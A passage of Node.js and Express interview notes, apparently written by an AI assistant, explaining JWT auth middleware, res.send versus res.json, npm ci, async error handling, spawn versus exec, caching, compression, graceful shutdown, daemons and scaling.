    SECRET,
    { expiresIn: '1h' }
  );
  res.json({ token });
});

// ─── AUTHENTICATION MIDDLEWARE ────────────────────────
function authenticate(req, res, next) {
  const header = req.headers.authorization;
  if (!header) return res.status(401).json({ error: 'No token' });

  const token = header.split(' ')[1];  // "Bearer <token>"
  try {
    req.user = jwt.verify(token, SECRET);
    next();
  } catch {
    res.status(403).json({ error: 'Invalid token' });
  }
}

// ─── AUTHORIZATION MIDDLEWARE (Role-based) ────────────
function authorize(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// ─── PROTECTED ROUTES ─────────────────────────────────
app.get('/profile', authenticate, (req, res) => {
  res.json({ user: req.user });
});

app.delete('/admin/user/:id', authenticate, authorize('admin'), (req, res) => {
  res.json({ message: 'User deleted' });
});
```

### Common Strategies

| Strategy | Best For |
| --- | --- |
| **JWT** | Stateless APIs, SPAs, mobile apps |
| **Sessions + Cookies** | Traditional server-rendered web apps |
| **OAuth 2.0** | Third-party login (Google, GitHub) |
| **API Keys** | Server-to-server calls |

### Best Practices

- **Always hash passwords** with `bcrypt`/`argon2` (never store plain text).
- **Store secrets** (JWT secret, DB passwords) in environment variables.
- **Use HTTPS** to protect tokens in transit.
- **Set short expiry** on access tokens; use refresh tokens.
- **Validate and sanitize** all inputs to prevent injection.
- Use **libraries like Passport.js** for complex setups.

### 📌 Summary

Authentication verifies *who* a user is (via login + password hashing + token generation); authorization verifies *what* they can do (via role/permission checks). A typical Node/Express implementation uses `bcrypt` for password hashing, `jsonwebtoken` for issuing tokens, and middleware chains (`authenticate` → `authorize`) to protect routes.

1. Difference between `res.send()` and `res.json()` in Express

### `res.send()`

- Sends a response of **any type** — string, Buffer, object, array, boolean.
- Auto-sets `Content-Type` based on argument:
    - String → `text/html`
    - Object/Array → `application/json`
    - Buffer → `application/octet-stream`

```jsx
res.send('Hello');                 // Content-Type: text/html
res.send({ name: 'Alice' });       // Content-Type: application/json
res.send(Buffer.from('data'));     // Content-Type: application/octet-stream
```

### `res.json()`

- Specifically sends a **JSON response**.
- Always sets `Content-Type: application/json`.
- Calls `JSON.stringify()` internally — supports `app.set('json replacer')` and `app.set('json spaces')` settings.
- Handles non-objects (`null`, `undefined`, `number`, `boolean`) by serializing them as valid JSON.

```jsx
res.json({ name: 'Alice' });   // {"name":"Alice"}
res.json(null);                // null  (valid JSON)
res.json([1, 2, 3]);           // [1,2,3]
```

### Key Comparison

| Feature | `res.send()` | `res.json()` |
| --- | --- | --- |
| Data types accepted | Any (string/buffer/object/etc.) | Anything JSON-serializable |
| Content-Type | Varies (auto-detect) | Always `application/json` |
| Uses `JSON.stringify` | Only for objects | Always |
| Respects JSON settings | ❌ No | ✅ Yes |
| Best for | Mixed/flexible responses | REST APIs |

### Practical Recommendation

- Building a **REST API**? Use `res.json()` — it's explicit and consistent.
- Sending HTML, files, or mixed content? Use `res.send()`.

### 📌 Summary

`res.send()` is flexible — it auto-detects the content type based on the data. `res.json()` always serializes to JSON and sets `Content-Type: application/json`, making it the preferred choice for REST APIs. Functionally, `res.json(obj)` ≈ `res.send(JSON.stringify(obj))` with explicit JSON handling.

1. What Does `npm ci` Do Differently Than `npm install`?

### `npm install`

- Installs dependencies listed in `package.json`.
- **May update** `package-lock.json` if `package.json` changed or if versions resolve differently.
- Installs missing packages; doesn't remove extras.
- Flexible — useful during development.

### `npm ci` (Clean Install)

- Designed for **CI/CD environments** and production builds.
- **Requires** `package-lock.json` to exist; fails otherwise.
- **Deletes** `node_modules` entirely before installing.
- Installs **exactly** what's in `package-lock.json` — never modifies it.
- **Fails** if `package.json` and lock file are out of sync.
- Much **faster** than `npm install`.

### Comparison Table

| Feature | `npm install` | `npm ci` |
| --- | --- | --- |
| Reads from | `package.json` + lockfile | `package-lock.json` only |
| Modifies lockfile | ✅ Yes (can update) | ❌ No |
| Deletes `node_modules` first | ❌ No | ✅ Yes |
| Requires lockfile | ❌ No | ✅ Yes (fails without) |
| Installs individual packages | ✅ Yes | ❌ No |
| Speed | Slower | Faster |
| Best for | Local development | CI/CD, production |

### Example CI Pipeline

```yaml
# .github/workflows/ci.yml
- run: npm ci              # Clean, reproducible install
- run: npm test
- run: npm run build
```

### 📌 Summary

`npm install` is for development — it installs dependencies and may update the lockfile. `npm ci` is for CI/CD — it performs a clean install strictly from `package-lock.json`, is faster and guarantees reproducibility, but fails if the lockfile is missing or out of sync.

1. How to Handle Promise Rejections Globally

When a Promise rejection isn't caught anywhere, Node.js emits an `unhandledRejection` event on the process.

### Unhandled Rejection Handler

```jsx
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise);
  console.error('Reason:', reason);

  // Log to monitoring service (Sentry, Datadog, etc.)
  // logger.error({ reason, promise });

  // Best practice: let the process crash and restart
  process.exit(1);
});
```

### Uncaught Exception Handler (sync errors)

```jsx
process.on('uncaughtException', (err, origin) => {
  console.error('Uncaught Exception:', err);
  console.error('Origin:', origin);

  // Do synchronous cleanup only — process is in undefined state
  process.exit(1);
});
```

### Why Exit the Process?

After an uncaught error, the application state may be **corrupted**. It's safer to:

1. Log the error.
2. Exit cleanly.
3. Let a process manager (PM2, Docker, Kubernetes) restart the service.

### Modern Node.js Default Behavior

Since **Node.js 15+**, unhandled rejections **crash the process by default** (`--unhandled-rejections=throw`). Still, having explicit handlers lets you log before exiting.

### Flow Diagram

`Promise.reject()
      │
      ▼
 Any .catch()? ──Yes──► Handled, continue
      │
      No
      ▼
process 'unhandledRejection' fires
      │
      ▼
Log error → Cleanup → process.exit(1)
      │
      ▼
Process manager (PM2/Docker) restarts app`

### Best Practices

- **Always** attach `.catch()` or use `try/catch` with `async/await`.
- Treat the global handler as a **safety net**, not primary error handling.
- Log extensively before exiting.
- Combine with tools like `pm2 --max-memory-restart` or Docker restart policies.

### 📌 Summary

Use `process.on('unhandledRejection')` for global promise rejection handling and `process.on('uncaughtException')` for sync errors. Log the error and exit the process so a process manager can restart it, since the app's state may be corrupted. Consider these handlers a last-resort safety net — always catch errors at the source.

1. How to Handle Async Errors in Express Route Handlers

**The problem:** Express 4 doesn't automatically catch errors thrown inside async route handlers — the request hangs indefinitely.

```jsx
// ❌ Express 4: This will hang forever if fetchUser() throws
app.get('/user/:id', async (req, res) => {
  const user = await fetchUser(req.params.id);  // throws!
  res.json(user);
});
```

### Solution 1: Explicit `try/catch`

```jsx
app.get('/user/:id', async (req, res, next) => {
  try {
    const user = await fetchUser(req.params.id);
    res.json(user);
  } catch (err) {
    next(err);  // Forward to error middleware
  }
});
```

✅ Works but gets repetitive.

### Solution 2: Async Wrapper Utility

```jsx
// Utility
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

// Usage
app.get('/user/:id', asyncHandler(async (req, res) => {
  const user = await fetchUser(req.params.id);
  res.json(user);
}));
```

✅ DRY, reusable.

### Solution 3: `express-async-errors` Package

```jsx
require('express-async-errors');   // Patches Express; just import it

app.get('/user/:id', async (req, res) => {
  const user = await fetchUser(req.params.id);
  res.json(user);                  // Errors auto-forwarded to middleware
});
```

✅ Zero boilerplate.

### Solution 4: Express 5 (Native Support)

Express 5 natively handles async errors — just return a rejected promise and it auto-forwards to the error middleware.

```jsx
// Express 5 — works out of the box
app.get('/user/:id', async (req, res) => {
  const user = await fetchUser(req.params.id);
  res.json(user);
});
```

### The Central Error Middleware

No matter which solution you pick, you need a central error handler:

```jsx
app.use((err, req, res, next) => {
  console.error(err.stack);
  const status = err.statusCode || 500;
  res.status(status).json({
    error: err.message || 'Internal Server Error'
  });
});
```

### 📌 Summary

In Express 4, async errors aren't automatically caught — you must either wrap handlers in `try/catch` + `next(err)`, use an `asyncHandler` utility, or import the `express-async-errors` package. Express 5 handles this natively. Always pair your solution with a central error-handling middleware that returns a proper JSON response.

1. Difference between `spawn` and `exec` in `child_process`

Both are part of Node's `child_process` module, used to run external commands/programs, but they behave very differently.

### `spawn(command, args, options)`

- Launches a new process **streaming** its I/O.
- **No output buffer limit** — suitable for large outputs.
- Returns a `ChildProcess` object with `stdout`/`stderr` streams.
- **Doesn't spawn a shell** by default (safer, more efficient).

```jsx
const { spawn } = require('child_process');
const ls = spawn('ls', ['-lh', '/usr']);

ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});
ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});
ls.on('close', (code) => {
  console.log(`exited with code ${code}`);
});
```

### `exec(command, callback)`

- Runs a command in a **shell** and **buffers** all output.
- Passes complete `stdout`/`stderr` to the callback at the end.
- Default buffer limit is **1 MB** — larger output crashes it.
- Convenient for small commands with small output.

```jsx
const { exec } = require('child_process');

exec('ls -lh /usr', (err, stdout, stderr) => {
  if (err) return console.error(err);
  console.log('stdout:', stdout);
  console.log('stderr:', stderr);
});
```

### Visual Comparison

`spawn ─────────────────────────────────────────
   stdout stream ─► chunk ─► chunk ─► chunk ─► ...
   (processed as data arrives — streaming)

exec ──────────────────────────────────────────
   [buffer fills...]  ─► full output ─► callback
   (waits for command to finish, then returns all at once)`

### Comparison Table

| Feature | `spawn` | `exec` |
| --- | --- | --- |
| Returns | Stream-based `ChildProcess` | Callback/Promise with buffered output |
| Shell | Not by default | Always uses a shell |
| Output | Streamed (unlimited) | Buffered (default 1 MB) |
| Best for | Long-running / large output | Short commands with small output |
| Performance | Lighter | Heavier (spawns a shell) |
| Shell injection risk | Low | Higher (be careful with user input) |

### When to Use Which?

- **Use `spawn`** for: `ffmpeg` processing, tailing logs, image manipulation, large file outputs, long-running processes.
- **Use `exec`** for: quick one-liners like `git --version`, `node -v`, `echo $PATH`.

### Related: `execFile` and `fork`

- `execFile` — like `exec` but without a shell (safer).
- `fork` — special case of `spawn` for Node.js child scripts, enables IPC.

### 📌 Summary

`spawn` streams output in real-time with no buffer limit — ideal for long-running processes or large outputs. `exec` buffers all output and passes it to a callback — convenient for small one-shot commands but will fail if output exceeds 1 MB. `spawn` is lighter and safer; `exec` runs in a shell, so beware of injection with user input.

1. How to Implement Caching in Node.js

Caching stores computed/fetched data so that repeated requests are faster and less costly.

### Types of Caching

### A) In-Memory Caching (simple `Map` or object)

Good for small, single-instance apps.

```jsx
const cache = new Map();

async function getUser(id) {
  if (cache.has(id)) return cache.get(id);
  const user = await db.findUser(id);
  cache.set(id, user);
  return user;
}
```

⚠️ Downsides: no expiry, memory grows indefinitely, not shared across instances.

### B) `node-cache` (in-memory with TTL)

```jsx
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 600 });  // 10 min

async function getUser(id) {
  const cached = cache.get(id);
  if (cached) return cached;
  const user = await db.findUser(id);
  cache.set(id, user);
  return user;
}
```

### C) Redis (distributed cache — RECOMMENDED for production)

Works across multiple Node instances.

```jsx
const { createClient } = require('redis');
const redis = createClient();
await redis.connect();

async function getUser(id) {
  const cached = await redis.get(`user:${id}`);
  if (cached) return JSON.parse(cached);

  const user = await db.findUser(id);
  await redis.setEx(`user:${id}`, 600, JSON.stringify(user));
  return user;
}
```

### D) HTTP Caching (Browser + CDN)

Set cache headers in Express:

```jsx
app.get('/api/products', (req, res) => {
  res.set('Cache-Control', 'public, max-age=300');   // 5 min
  res.json(products);
});
```

### E) Memoization (caching function results)

```jsx
const memoize = (fn) => {
  const cache = new Map();
  return (...args) => {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn(...args);
    cache.set(key, result);
    return result;
  };
};
const slowFn = memoize((n) => { /* heavy computation */ });
```

### Caching Architecture Diagram

        `┌──────────┐
Client ►│   CDN    │  ← Layer 1 (edge/global)
        └────┬─────┘
             ▼
        ┌──────────┐
        │  Nginx   │  ← Layer 2 (reverse-proxy cache)
        └────┬─────┘
             ▼
   ┌─────────────────┐
   │  Node.js App    │  ← Layer 3 (in-memory / node-cache)
   └────┬───────┬────┘
        ▼       ▼
    ┌──────┐ ┌──────┐
    │Redis │ │  DB  │  ← Layer 4 (distributed cache → DB)
    └──────┘ └──────┘`

### Cache Invalidation Strategies

- **TTL (time-to-live)** — expire after N seconds.
- **Write-through** — update cache + DB together.
- **Cache-aside** (lazy loading) — populate on miss (most common).
- **Event-based** — invalidate when source data changes.

### 📌 Summary

Node.js caching can be done at multiple levels: in-memory (`Map`, `node-cache`) for single-instance apps, **Redis** for distributed production setups, HTTP headers for browser/CDN caching, and memoization for expensive function calls. Always pair caching with a clear invalidation strategy (TTL, write-through, or event-based) to avoid stale data.

1. Purpose of the `compression` Middleware

### What It Does

The `compression` middleware **compresses HTTP response bodies** (using gzip or deflate) before sending them to the client, reducing the amount of data transferred over the network.

### Usage

```jsx
const express = require('express');
const compression = require('compression');
const app = express();

app.use(compression());   // Apply to all routes

app.get('/data', (req, res) => {
  res.json({ large: 'payload'.repeat(10000) });  // Sent compressed
});
```

### How It Works

`Without compression:
  Server ──── 500 KB JSON ────► Client  (slow)

With compression:
  Server ──[gzip]──► 50 KB ────► Client ──[unzip]──► 500 KB
  (10× smaller over the wire)`

1. Client sends `Accept-Encoding: gzip, deflate`.
2. Server compresses the response body.
3. Server adds `Content-Encoding: gzip`.
4. Client decompresses it transparently.

### Benefits

- **Smaller payloads** (often 60–90% reduction for text/JSON/HTML).
- **Faster page loads**, especially on slow networks.
- **Lower bandwidth costs**.

### Configuration Options

```jsx
app.use(compression({
  level: 6,          // Compression level (0–9, default 6)
  threshold: 1024,   // Skip responses smaller than 1 KB
  filter: (req, res) => {
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);  // Default behavior
  }
}));
```

### Caveats

- Compression consumes **CPU**. For tiny responses, overhead may outweigh savings (hence `threshold`).
- Don't compress already-compressed formats (JPEG, PNG, MP4).
- In production, compression is often handled by the **reverse proxy** (Nginx, Cloudflare) instead, which is more efficient.

### 📌 Summary

The `compression` middleware reduces response size using gzip/deflate, making text-heavy APIs significantly faster and cheaper to serve. It's easy to add (`app.use(compression())`) but consumes CPU — so small responses are skipped by default, and in production it's often offloaded to a reverse proxy like Nginx.

1. How to Implement Graceful Shutdown in Node.js

### Why It Matters

When a Node.js server is killed abruptly (e.g., on deploy), it may:

- Drop in-flight HTTP requests → users see errors.
- Corrupt in-progress DB writes.
- Leave open connections dangling.

**Graceful shutdown** = giving the app a chance to finish ongoing work before exiting.

### Graceful Shutdown Flow

   `Signal received (SIGTERM / SIGINT)
                │
                ▼
   Stop accepting NEW connections (server.close)
                │
                ▼
   Wait for IN-FLIGHT requests to complete
                │
                ▼
   Close DB connections / caches / queues
                │
                ▼
       process.exit(0)    (or timeout → forced exit)`

### Full Example

```jsx
const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.get('/', (req, res) => res.send('Hello'));

const server = app.listen(3000, () => console.log('Running on 3000'));

// Reusable shutdown handler
function shutdown(signal) {
  console.log(`${signal} received. Shutting down gracefully...`);

  // 1. Stop accepting new connections
  server.close(async (err) => {
    if (err) {
      console.error('Error closing server:', err);
      process.exit(1);
    }
    console.log('HTTP server closed');

    // 2. Close DB connections
    try {
      await mongoose.connection.close();
      console.log('DB connection closed');
    } catch (e) {
      console.error('Error closing DB:', e);
    }

    // 3. Close other resources (Redis, queues, etc.)
    // await redis.quit();

    process.exit(0);
  });

  // 4. Force shutdown if it takes too long
  setTimeout(() => {
    console.error('Forcing shutdown (timeout exceeded)');
    process.exit(1);
  }, 10_000).unref();
}

// Listen for termination signals
process.on('SIGTERM', () => shutdown('SIGTERM'));  // kill / Docker / k8s
process.on('SIGINT', () => shutdown('SIGINT'));    // Ctrl+C
```

### Common Signals

| Signal | Source |
| --- | --- |
| `SIGTERM` | `kill <pid>`, Docker stop, Kubernetes |
| `SIGINT` | `Ctrl+C` in terminal |
| `SIGHUP` | Terminal closed |
| `SIGKILL` | `kill -9` (**cannot be caught**) |

### Best Practices

- Always set a **timeout fallback** — don't hang forever.
- Handle both `SIGTERM` and `SIGINT`.
- Implement a `/health` or `/ready` endpoint that returns 503 during shutdown so load balancers stop routing traffic.
- In Kubernetes, configure `terminationGracePeriodSeconds` to match your timeout.

### 📌 Summary

Graceful shutdown means responding to `SIGTERM`/`SIGINT` by stopping new traffic, waiting for in-flight requests to finish, closing DB/cache connections, and then exiting — all within a timeout. This prevents dropped requests and data corruption during deploys, restarts, or scaling events.

1. What is a Daemon Process? How to Implement It in Node.js

### Definition

A **daemon** is a **long-running background process** that is detached from a controlling terminal. It starts at system boot (typically) and keeps running, handling requests or performing tasks (log rotators, schedulers, web servers).

Common examples: `sshd`, `httpd`, `mysqld` — the trailing "d" stands for *daemon*.

### Characteristics

- Runs in the background.
- Detached from the terminal/session.
- No direct user interaction.
- Restarts on crash (usually via a supervisor).
- Often writes to log files instead of stdout.

### Regular Process vs Daemon

`REGULAR PROCESS                     DAEMON PROCESS
     │                                   │
  Terminal                            (detached)
     │                                   │
   Node App  ─ dies when                Node App  ─ keeps running
               terminal closes                      independently`

### Implementation 1: Using `child_process` (manual daemonization)

```jsx
const { spawn } = require('child_process');
const fs = require('fs');

const out = fs.openSync('./out.log', 'a');
const err = fs.openSync('./err.log', 'a');

const child = spawn('node', ['worker.js'], {
  detached: true,              // Break from parent
  stdio: ['ignore', out, err]  // Redirect stdio to files
});

child.unref();                 // Allow parent to exit independently
console.log(`Daemon PID: ${child.pid}`);
process.exit(0);
```

### Implementation 2: PM2 (Recommended — production standard)

```bash
npm install -g pm2

pm2 start app.js --name my-api       # Start as daemon
pm2 list                             # List daemons
pm2 logs my-api                      # Tail logs
pm2 restart my-api                   # Restart
pm2 stop my-api                      # Stop
pm2 startup                          # Auto-start on boot
pm2 save                             # Persist list across reboots
```

PM2 handles:

- Daemonization
- Auto-restart on crash
- Cluster mode (load balancing)
- Log management
- Monitoring

### Implementation 3: `systemd` (Linux native, bare-metal/VPS)

ini

```bash
# /etc/systemd/system/myapp.service
[Unit]
Description=My Node.js App
After=network.target

[Service]
ExecStart=/usr/bin/node /var/www/myapp/index.js
Restart=always
User=www-data
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable myapp
sudo systemctl start myapp
sudo systemctl status myapp
```

### Implementation 4: Docker (modern preferred approach)

Run the container with `--restart=always` or use an orchestrator (Kubernetes). The container runtime handles daemonization.

### 📌 Summary

A daemon is a background process detached from the terminal that runs indefinitely. In Node.js, you rarely daemonize manually — instead, use **PM2** (most common), **systemd** (Linux services), or **Docker/Kubernetes** (cloud/modern). These tools handle detachment, auto-restart, logging, and startup on boot.

1. How Would You Scale a Node.js Application?

Scaling = handling increased load. There are two fundamental axes and several techniques.

### Vertical vs Horizontal Scaling

`VERTICAL (scale up)             HORIZONTAL (scale out)
 ┌───────────┐                   ┌────┐ ┌────┐ ┌────┐
 │  Bigger   │                   │App1│ │App2│ │App3│
 │  Server   │                   └────┘ └────┘ └────┘
 │ (8→32 CPU)│                     ↑ many small instances
 └───────────┘                       behind a load balancer`

### 1. Cluster Module (use all CPU cores)

Node is single-threaded. The `cluster` module forks one worker per CPU core.

```jsx
const cluster = require('cluster');
const os = require('os');

if (cluster.isPrimary) {
  os.cpus().forEach(() => cluster.fork());
  cluster.on('exit', () => cluster.fork());  // auto-restart
} else {
  require('./server');  // Each worker runs the app
}
```

### 2. Load Balancing (horizontal)

Put multiple Node instances behind an Nginx/HAProxy/AWS ELB.

`Client → Load Balancer → [Node 1] [Node 2] [Node 3]`

### 3. Worker Threads (CPU-intensive tasks)

Offload CPU-heavy work so the event loop stays responsive.

```jsx
const { Worker } = require('worker_threads');
new Worker('./heavy-computation.js');
```

### 4. Caching (reduce DB load)

Use Redis/Memcached for frequently accessed data (see Q13).

### 5. Database Optimization

- Add indexes.
- Use read replicas.
- Connection pooling.
- Shard large tables.

### 6. Microservices

Break a monolith into focused services that scale independently.

`Monolith                Microservices
  ┌────────┐             ┌───────┐  ┌───────┐
  │  App   │       →     │ Auth  │  │ Orders│
  │ Users  │             └───────┘  └───────┘
  │ Orders │             ┌───────┐  ┌───────┐
  │  Auth  │             │ Users │  │ Search│
  └────────┘             └───────┘  └───────┘`

### 7. Message Queues (async processing)

Offload slow tasks (emails, image processing) to background workers using RabbitMQ, Kafka, or BullMQ.

### 8. CDN for Static Assets

Serve images, CSS, JS from Cloudflare/CloudFront — relieves your Node server.

### 9. Containerization + Orchestration

Use Docker + Kubernetes for automated horizontal scaling based on CPU/memory metrics.

### Complete Scaled Architecture

          `┌──────── CDN (static) ──────────┐
Clients ──┤                                │
          └─► Load Balancer                │
                │                          │
      ┌─────────┼─────────┐                │
      ▼         ▼         ▼                │
   Node+      Node+     Node+              │
  Cluster   Cluster   Cluster              │
      │         │         │                │
      └────┬────┴────┬────┘                │
           ▼         ▼                     │
        Redis   Message Queue              │
           │         │                     │
           ▼         ▼                     │
      Database   Workers (bg jobs)         │
                                           ▼
                              (images, CSS, JS)`

### 📌 Summary

Scaling Node.js combines several strategies: use the **cluster module** to leverage all CPU cores on one machine, **horizontal scaling** with a load balancer for multiple machines, **worker threads** for CPU-bound tasks, **caching** (Redis) and DB optimization for data, **microservices** for independent scaling, **message queues** for async jobs, **CDNs** for static assets, and **Docker/Kubernetes** for orchestration. Most real systems use multiple strategies together.

1. Difference between Cluster Module and Load Balancer

Both distribute traffic, but they operate at different scopes.

### Cluster Module (Node.js built-in)

- Forks multiple **Node.js processes** on a **single machine**.
- All workers share the same port (primary process uses OS-level IPC to distribute).
- Managed by Node's runtime.
- Limited by **one machine's resources**.

```jsx
const cluster = require('cluster');
const os = require('os');

if (cluster.isPrimary) {
  os.cpus().forEach(() => cluster.fork());
} else {
  require('./app');
}
```

### Load Balancer (external infrastructure)

- Distributes traffic across **multiple machines/servers**.
- Typically a separate service: Nginx, HAProxy, AWS ELB, Cloudflare.
- Supports SSL termination, health checks, rate limiting, sticky sessions.
- Works independently of the application.

```jsx
# Nginx load balancer config
upstream nodeapp {
  server 10.0.0.1:3000;
  server 10.0.0.2:3000;
  server 10.0.0.3:3000;
}
server {
  listen 80;
  location / {
    proxy_pass http://nodeapp;
  }
}
```

### Visual Comparison

`CLUSTER MODULE (1 machine, N processes)
─────────────────────────────────────────
 ┌──────────────────────────────────────┐
 │             Machine (8-core)         │
 │  Primary                             │
 │    ├── Worker 1 ─┐                   │
 │    ├── Worker 2 ─┤                   │
 │    ├── Worker 3 ─┼── Port 3000       │
 │    └── Worker 4 ─┘                   │
 └──────────────────────────────────────┘

LOAD BALANCER (N machines, 1+ processes each)
─────────────────────────────────────────────
   ┌──── Load Balancer (Nginx) ────┐
   │                               │
   ▼               ▼               ▼
 Machine 1      Machine 2      Machine 3
  (Node)         (Node)         (Node)

THEY COMBINE (best of both worlds)
──────────────────────────────────
  ┌──── Load Balancer ────┐
  │          │            │
  ▼          ▼            ▼
Machine 1  Machine 2   Machine 3
cluster×4  cluster×4   cluster×4`

### Comparison Table

| Feature | Cluster Module | Load Balancer |
| --- | --- | --- |
| Scope | Single machine | Multiple machines |
| Type | Node.js built-in | External service |
| Language-specific | Yes (Node only) | No (any language) |
| Scales CPU cores | ✅ | ❌ (by itself) |
| Scales across machines | ❌ | ✅ |
| SSL termination | ❌ | ✅ |
| Health checks | Basic | Advanced |
| Shares memory | ❌ (separate processes) | ❌ |
| Cost | Free | May cost (ELB etc.) |

### When to Use Which?

- **Small app, one server** → Cluster alone is enough.
- **Need high availability or cross-machine scale** → Load balancer (and cluster per machine).
- **Production systems** → almost always use **both**.

### 📌 Summary

The **cluster module** scales Node.js across CPU cores on one machine; a **load balancer** scales across multiple machines. Cluster is Node-specific and free; load balancers are infrastructure-level and language-agnostic. In production, you typically combine them — a load balancer fans traffic to many servers, and each server runs cluster mode to maximize its cores.

---

These notes should cover all 18 questions comprehensively. Let me know if you'd like me to expand any answer, add more code examples, or export these as a downloadable Markdown file for easier note-taking!
